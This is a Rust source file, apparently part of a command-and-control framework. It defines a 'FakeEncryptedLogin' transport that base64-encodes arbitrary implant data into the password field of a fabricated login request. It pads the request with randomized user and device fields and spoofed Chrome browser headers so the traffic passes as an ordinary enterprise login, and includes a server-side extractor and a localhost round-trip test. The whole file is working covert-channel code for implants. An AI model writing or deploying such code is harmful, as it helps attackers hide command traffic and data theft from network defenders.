// zzz_core/src/transport/implementation/fake_encrypted_login.rs

use actix_web::{web, HttpRequest, HttpResponse};
use serde_json::json;
use uuid::Uuid;
use std::time::{SystemTime, UNIX_EPOCH};
use crate::binary_data_process::z_base::{Base64, Encoder as _};
use crate::transport::base::{TransportHttpType, TransportTrait, TransportHttpA};
use once_cell::sync::Lazy;
use regex::Regex;


static RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#""pwd"\s*:\s*"([A-Za-z0-9+/=]+)""#).unwrap()
});

pub struct FakeEncryptedLogin;

impl TransportTrait for FakeEncryptedLogin {
    const SUPPORT: &'static str = "zy:yz";
    const PROCESS: &'static str = "a";

    type ExtractIn = TransportHttpType;
    type InjectIn = TransportHttpType;
    type InjectOut = TransportHttpType;

    
    fn extract(input: Self::ExtractIn) -> Option<Vec<u8>> {
        if let TransportHttpType::HttpRequest((_, bytes)) = input {
            let body_str = std::str::from_utf8(&bytes).ok()?;

            let caps = RE.captures(body_str)?;
            let encoded_part = caps.get(1)?.as_str();

            Base64::decode(encoded_part)
        } else {
            None
        }
    }

    
    
    fn inject(input: Self::InjectIn) -> Option<Self::InjectOut> {
        if let TransportHttpType::Request((payload, urlpath, urlbase)) = input {
            let encoded_payload = Base64::encode(payload);

            
            let userid = Uuid::new_v4().to_string();

            
            let remember_me = rand::random::<bool>();

            
            let timestamp = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_millis();

            
            let login_body = json!({
                "userid": userid,
                "pwd": encoded_payload,          
                "remember_me": remember_me,
                "version": "2.4.1",
                "timestamp": timestamp,

                
                "device_id": Uuid::new_v4().to_string(),
                "os": "Windows 10",
                "os_version": "10.0.19045",
                "lang": "zh-CN",
                "client_type": "desktop",
                "grant_type": "password",
                "app_id": "com.example.enterprise"
            });

            
            let full_url = if urlbase.ends_with('/') && urlpath.starts_with('/') {
                format!("{}{}", urlbase.trim_end_matches('/'), urlpath)
            } else if !urlbase.ends_with('/') && !urlpath.starts_with('/') {
                format!("{}/{}", urlbase, urlpath)
            } else {
                format!("{}{}", urlbase, urlpath)
            };

            
            let builder = reqwest::blocking::Client::new()
                .post(&full_url)
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
                .header("Accept", "application/json, text/plain, */*")
                .header("Content-Type", "application/json")
                .header("Origin", urlbase.trim_end_matches('/'))
                .header("Referer", format!("{}/login", urlbase.trim_end_matches('/')))
                .header("Sec-Fetch-Site", "same-origin")
                .json(&login_body);

            Some(TransportHttpType::RequestBuilder(builder))
        } else {
            None
        }
    }
}

impl TransportHttpA for FakeEncryptedLogin {}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use actix_web::web;
    use reqwest::blocking::Client;
    use crate::web::base::{WebServer, RouteConfig};
    use crate::transport::base::TransportHttpType as HTTP;

    const TEST_DATA: &[u8; 62] = b"f8d1763a-a376-40e9-9b1f8d1763a-a376-40e9-9b1e-40e5e0e5e917d96d";

    async fn login_handler(req: HttpRequest, body: web::Bytes) -> HttpResponse {
        if let Some(extracted) = FakeEncryptedLogin::extract(
            HTTP::HttpRequest((req, body))
        ) {
            println!("Successfully extracted {} bytes hidden payload", extracted.len());
            return HttpResponse::Ok()
                .content_type("application/json")
                .body(r#"{"code":200,"message":"login success","token":"fake-jwt-abc123"}"#);
        }

        HttpResponse::BadRequest().body("No hidden payload found")
    }

    #[test]
    fn test_fake_encrypted_login_roundtrip() {
        let mut server = WebServer::new(0);  // 0 表示随机端口

        server.register_routes(vec![
            RouteConfig::new(|cfg| {
                cfg.route("/api/v2/auth/login", web::post().to(login_handler));
            }),
        ]);

        let port = server.start().unwrap();
        let base_url = format!("http://127.0.0.1:{}", port);

        let urlbase = base_url.clone();
        let urlpath = "/api/v2/auth/login".to_string();
        let payload = Vec::from(TEST_DATA);

        let inject_result = FakeEncryptedLogin::inject(
            HTTP::Request((payload.clone(), urlpath, urlbase))
        );

        assert!(inject_result.is_some(), "inject should return Some(RequestBuilder)");

        if let Some(HTTP::RequestBuilder(builder)) = inject_result {
            // 发送请求（模拟 Implant 发送）
            let response = builder.send().expect("Failed to send request");

            assert!(response.status().is_success(), "Server should return 200 OK");

            let text = response.text().unwrap();
            assert!(text.contains("login success"), "Should return success message");

            println!("Test passed! Hidden payload successfully injected and extracted.");
            println!("Original data len: {}", TEST_DATA.len());
        }

        server.stop();
    }
}